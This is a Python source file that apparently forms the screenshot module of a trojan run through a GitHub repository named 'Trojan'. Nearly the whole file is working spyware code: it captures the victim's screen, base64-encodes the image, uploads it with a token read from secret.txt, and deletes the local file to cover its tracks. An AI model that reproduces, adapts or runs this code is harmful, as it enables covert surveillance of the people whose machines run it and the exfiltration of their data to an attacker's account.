import pyautogui
import os
import base64
from datetime import datetime
import github3  # Make sure this is imported

# Define the github_connect function
def github_connect():
    with open('secret.txt') as f:
        token = f.read().strip()
    user = 'hacksparkdev'
    sess = github3.login(token=token)
    return sess.repository(user, 'Trojan')

def take_screenshot():
    # Generate a unique filename based on the current timestamp
    filename = f'screenshot_{datetime.now().strftime("%Y%m%d_%H%M%S")}.png'
    
    # Take a screenshot
    screenshot = pyautogui.screenshot()
    
    # Save the screenshot to the current directory
    screenshot.save(filename)
    
    return filename

def send_screenshot_to_github(filename, repo, data_path):
    try:
        with open(filename, 'rb') as file:
            bindata = base64.b64encode(file.read()).decode('utf-8')
        
        message = f"Screenshot taken at {datetime.now().isoformat()}"
        remote_path = f'{data_path}{filename}'
        repo.create_file(remote_path, message, bindata)
        print(f"Screenshot {filename} uploaded to GitHub.")
    except Exception as e:
        print(f"Error uploading screenshot to GitHub: {e}")

def run():
    # Ensure github_connect is called before it's used
    repo = github_connect()  
    data_path = 'data/screenshots/'  # Adjust this path based on your setup
    
    # Take a screenshot
    screenshot_file = take_screenshot()
    
    # Send the screenshot to GitHub
    send_screenshot_to_github(screenshot_file, repo, data_path)
    
    # Clean up by deleting the local screenshot file after uploading
    os.remove(screenshot_file)
    print("Screenshot module executed")

# Execute the run function when the module is executed
if __name__ == "__main__":
    run()

